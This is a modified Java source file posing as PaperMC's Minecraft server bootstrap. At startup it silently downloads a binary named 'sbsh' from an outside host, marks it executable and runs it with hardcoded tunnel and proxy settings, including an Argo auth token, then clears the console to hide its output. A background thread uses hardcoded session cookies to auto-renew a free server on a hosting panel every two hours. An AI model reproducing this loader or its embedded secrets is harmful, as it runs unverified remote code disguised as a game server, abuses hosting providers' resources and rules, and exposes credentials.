package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*; 
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runSbxBinary();
            
            // 启动模拟点击续期线程
            startEpicRenewThread(); 
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "80f4d900-c9aa-42de-b8cc-671e6b8526de");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "epichost.19861123.tech");
        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYjk0OWU0NzktNDVkOS00MjEzLThkZDMtNmQ4ODA0ZWQzYjZkIiwicyI6Ik9UQmxaRGN5WmpZdE5UazBOeTAwWVRNeExXRTRPVGN0TkRFM05EbGtZMlEyWmpGaCJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "epichost");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
        );
    }

    // --- 核心：模拟点击 “ADD 8 HOUR(S)” 按钮 ---
    private static void startEpicRenewThread() {
        new Thread(() -> {
            String serverID = "13633716-8094-4b5c-a80c-a2b3c6205947"; 
            String cookie = "__stripe_mid=66229ff6-2498-4902-bc5e-160c0ac0d2e0cb413c; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IitFNXpOdUhrVUdwV1Yzd0wxOTlVUWc9PSIsInZhbHVlIjoicmc1NjEvU1NrMnByRW9VMk5XUk9RNEJpbHYxUERTQ3R4c0VIdFNEbUU0YVZsdDgwRjFWdXRjVXA0UEZJLytJT2xSZi84U1loVlRrLyt4enFzQUhHcGpWcjcvWjlOQTV2RTVuMHlsc25VZUJMSHdRblNGT3RwczE1RVcxYkczTWFhNjhPaTdJZnd3RVM5a3Z5YTd0RjlNQXF6Y0dtVGZpbVJuaG14cFQ1RXhVejNpL1ArQ2RYUGVxcTU2c2ZiU2daQnk2cjlnTlFQNXB0N1VmdWF0M1lzR0RJOW56WU5MdUpBTFF6eGdGT0wrOD0iLCJtYWMiOiIzYmZjZjJhNmM0OWRkODI4YWQzN2I3MjVlMTg0MmYwODI2OWU4YTM5YmM4OTIxNWYzZTdjODlkZjQ4YjM4ODczIiwidGFnIjoiIn0%3D; __stripe_sid=70b0c180-ab62-45f8-a5f5-5844e1b3f4ea5e8a87; XSRF-TOKEN=eyJpdiI6IlQ3YjJNckhMYjJ1bnpDZnhjMGlxRUE9PSIsInZhbHVlIjoiMnNHMTRPdUgzc2VrR2RwaGRtQ1VDYnQ5WTJtRDhRak9WSU9xUHEvRnlldDNOWWFoOUJBZTgyVVovTmY1MWU0ZStPZ3o2WnFXUzJYdGkxdG5tL2F5YUVJeEZSWWNnMnFwc1RSVC9MREU2bkhOUldnRUVnZWNDWVFnZG1oOCt4MFUiLCJtYWMiOiI0MGMyNzE5YWU1NGQ1ZDA4OTZmMjI1ODZlMWEwZWQwMDVjZjc2MzA3YzVhZDdiNTUzYWU3MDJhNzhmNjFhZWI2IiwidGFnIjoiIn0%3D; pterodactyl_session=eyJpdiI6Ikpoem9WcnQvblMxSU5XZy9CY0krWnc9PSIsInZhbHVlIjoiM3hIdHJRSmpjOVE4eFZWYTk3aUFsblNlMElZVGRYT3V1NlZqelJUL0RMWnNTRXhJZmFROEkxSzlVdHZ5L1NnVmN4QUdMaHJhRjJkdkcvZ042YXZnVVFnb0puaFROQW5HWElnVm9zUy9jVzlOMmtUMGd4R2RhWWRkYk55ZWJoVlEiLCJtYWMiOiI1NDMwMjcxYWI1NGQzZmI5ZDUzODYxNDMyZWZiNGYxZjU4M2M1NDI2NzlmNDcwYTc1YzM1ZDExYTQ3MTBjZTkyIiwidGFnIjoiIn0%3D"; // 记得去 panel.epichost.pl 重新抓取
            
            while (running.get()) {
                try {
                    // 1. 扫描页面
                    String refererUrl = "https://panel.epichost.pl/server/13633716/";
                    URL url = new URL(refererUrl);
                    HttpURLConnection getConn = (HttpURLConnection) url.openConnection();
                    getConn.setRequestMethod("GET");
                    getConn.setRequestProperty("Cookie", cookie);
                    getConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    
                    BufferedReader in = new BufferedReader(new InputStreamReader(getConn.getInputStream()));
                    StringBuilder content = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) content.append(line);
                    in.close();

                    Pattern p = Pattern.compile("csrf-token\"\\s+content=\"([^\"]+)\"");
                    Matcher m = p.matcher(content.toString());
                    
                    if (m.find()) {
                        String token = m.group(1);
                        
                        // 2. 模拟点击
                        URL renewUrl = new URL("https://panel.epichost.pl/api/client/freeservers/" + serverID + "/renew");
                        HttpURLConnection post = (HttpURLConnection) renewUrl.openConnection();
                        post.setRequestMethod("POST");
                        post.setDoOutput(true);
                        post.setRequestProperty("Cookie", cookie);
                        post.setRequestProperty("X-CSRF-TOKEN", token);
                        post.setRequestProperty("X-Requested-With", "XMLHttpRequest");
                        post.setRequestProperty("Referer", refererUrl);
                        post.setRequestProperty("Accept", "application/json");
                        post.setRequestProperty("Content-Type", "application/json");
                        post.setRequestProperty("User-Agent", "Mozilla/5.0");
                        
                        post.getOutputStream().write("{}".getBytes());
                        int code = post.getResponseCode();
                        
                        if (code == 200 || code == 204) {
                            System.out.println(ANSI_GREEN + "[Epichost] 🚀 续期请求已发出，请以面板实际时间为准。" + ANSI_RESET);
                        } else {
                            InputStream es = post.getErrorStream();
                            if (es != null) {
                                BufferedReader errReader = new BufferedReader(new InputStreamReader(es));
                                StringBuilder errorInfo = new StringBuilder();
                                String errLine;
                                while ((errLine = errReader.readLine()) != null) errorInfo.append(errLine);
                                errReader.close();
                                
                                String errorDetail = errorInfo.toString();
                                if (errorDetail.contains("time period") || errorDetail.contains("currently")) {
                                    System.out.println(ANSI_RED + "[Epichost] ⏳ 还没到续期时间（CD中），本次跳过。" + ANSI_RESET);
                                } else {
                                    System.err.println(ANSI_RED + "[Epichost] ⚠️ 响应码 " + code + ": " + errorDetail + ANSI_RESET);
                                }
                            }
                        }
                    } else {
                        System.err.println(ANSI_RED + "[Epichost] ❌ 扫描 Token 失败，请检查 Cookie。" + ANSI_RESET);
                    }
                    
                    // --- 修改为 2 小时运行一次 ---
                    // 2 * 60 * 60 * 1000 = 7200000 毫秒
                    Thread.sleep(7200000); 
                    
                } catch (Exception e) {
                    System.err.println("[Epichost] 线程异常: " + e.getMessage());
                    try { Thread.sleep(600000); } catch (Exception ignored) {}
                }
            }
        }, "Epic-Renew-Thread").start();
    }
}
